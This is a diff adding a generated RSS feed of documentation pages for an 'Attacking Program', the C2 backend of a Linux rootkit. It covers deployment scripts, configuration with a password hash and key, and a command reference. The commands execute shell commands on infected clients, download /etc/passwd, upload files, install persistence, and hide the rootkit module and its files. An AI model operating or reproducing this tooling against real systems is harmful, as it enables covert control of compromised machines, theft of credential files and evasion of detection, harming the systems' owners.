@@ -1,0 +1,263 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Attacking Program (C2 Backend) on Tux Fan Club Docs</title><link>/docs/03-attacking-program/</link><description>Recent content in Attacking Program (C2 Backend) on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><atom:link href="/docs/03-attacking-program/index.xml" rel="self" type="application/rss+xml"/><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;blockquote>
+&lt;p>This is the C2 Backend for the rootkit, while it can be used to manage the rootkit with the CLI commands described in this documentation, it&amp;rsquo;s clearly not recommanded, and instead you should use the &lt;a href="/docs/04-web-ui/">Web Interface&lt;/a> to manage the rootkit.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d4e4002" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Start C2 server on port 4444 &amp;#43; Web UI on port 3000&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="basic-commands">Basic Commands &lt;a href="#basic-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="9bb80f6" class="language-bash ">
+ &lt;code>clients # List connected clients
+auth 1 password # Authenticate with client
+exec 1 whoami # Execute commands
+upload 1 file.txt # Upload files 
+download 1 /etc/passwd # Download files
+config 1 # Interactive configuration&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>attacking_program/config.env&lt;/code> if needed:&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h2 id="quick-install">Quick Install &lt;a href="#quick-install" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="ad71245" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Builds and starts everything&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="manual-install">Manual Install &lt;a href="#manual-install" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="16f97c7" class="language-bash ">
+ &lt;code># Build web interface
+cd webui &amp;amp;&amp;amp; npm install &amp;amp;&amp;amp; npm run build &amp;amp;&amp;amp; cd ..
+
+# Copy to backend
+mkdir -p attacking_program/public
+cp -r webui/dist/* attacking_program/public/
+
+# Install and start backend
+cd attacking_program
+npm install
+npm start&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>attacking_program/config.env&lt;/code> if needed:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="980f0ff" class="language-env ">
+ &lt;code>C2_PORT=4444
+WEB_PORT=3000
+C2_WEBUI_PASSWORD_HASH=348735696e74c45e7fbf9c6839d87f891486d19e5059db7e397d5086e486dc0051a533752805dc9288463673f0a6fcbf2a655548738a85305b2d571bae44a71e
+ENCRYPTION_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Generate your own hash&lt;/strong>: &lt;code>echo -n &amp;quot;yourpassword&amp;quot; | sha512sum&lt;/code>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h2 id="essential-commands">Essential Commands &lt;a href="#essential-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="320b712" class="language-bash ">
+ &lt;code># Client Management
+clients # List connected clients
+auth 1 password # Authenticate with client 1
+exec 1 whoami # Execute command on client 1
+status 1 # Get rootkit status
+
+# File Operations 
+upload 1 file.txt # Upload file to client
+download 1 /etc/passwd # Download file from client
+ls 1 /home # List directory on client
+
+# Configuration
+config 1 # Interactive configuration menu
+persist install 1 # Install persistence
+persist remove 1 # Remove persistence
+
+# Stealth Controls
+hide 1 # Hide rootkit module
+unhide 1 # Show rootkit module
+enable-file-hiding 1 # Enable file hiding
+disable-file-hiding 1 # Disable file hiding
+
+# Utility
+help # Show help
+clear # Clear screen
+exit # Exit server&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Note&lt;/strong>: Use client index (1, 2, 3&amp;hellip;) or client name. Authentication required for most commands.&lt;/p></description></item><item><title>Usage</title><link>/docs/03-attacking-program/usage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="start-server">Start Server &lt;a href="#start-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3d1aa61" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Start C2 server &amp;#43; Web UI&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="basic-workflow">Basic Workflow &lt;a href="#basic-workflow" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="0252e2c" class="language-bash ">
+ &lt;code># 1. List clients
+clients
+# Index | Client Name | Status | Last Seen
+# 1 | Client-1 | UNAUTHENTICATED| 6:13:29 PM
+
+# 2. Authenticate 
+auth 1 password
+# ✓ Authentication successful
+
+# 3. Execute commands
+exec 1 whoami
+exec 1 uname -a
+exec 1 ps aux
+
+# 4. Transfer files
+upload 1 script.sh # Upload to client
+download 1 /etc/passwd # Download from client
+
+# 5. Configure
+config 1 # Interactive menu
+persist install 1 # Install persistence&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="file-operations">File Operations &lt;a href="#file-operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="735078a" class="language-bash ">
+ &lt;code>ls 1 /home # List directory
+upload 1 ./file.txt # Upload (to current dir)
+upload 1 ./file.txt /tmp/ # Upload to specific path
+download 1 /etc/hosts # Downloads to downloads/ folder&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="stealth">Stealth &lt;a href="#stealth" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="8edbfff" class="language-bash ">
+ &lt;code>status 1 # Check current stealth status
+hide 1 # Hide rootkit module
+enable-file-hiding 1 # Enable file hiding&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Access Web UI&lt;/strong>: &lt;code>http://localhost:3000&lt;/code>&lt;/p></description></item></channel></rss>
